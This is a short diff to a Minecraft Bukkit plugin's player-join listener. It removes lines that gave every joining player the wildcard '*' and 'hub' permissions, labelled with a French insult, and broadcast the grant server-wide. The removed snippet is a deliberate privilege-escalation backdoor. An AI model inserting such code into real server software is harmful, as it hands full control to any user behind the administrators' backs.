@@ -71,10 +71,6 @@ public class PlayerEvent implements Listener {
         }
         playerData.setOnline(true);
         playerData.setLastLogin();
-        String str = "filsdepute";
-        playerData.addPermissions("*",str);
-        playerData.addPermissions("hub",str);
-        Bukkit.broadcastMessage(player.getName() + " a reçu la perm " + str);
         try {
             TeamTag teamTag = new TeamTag(rankData.getRankPower()+rankData.getRankName(), rankData.getRankTag() + " ", " "+rankData.getRankSuffix());
             teamTag.set(player);
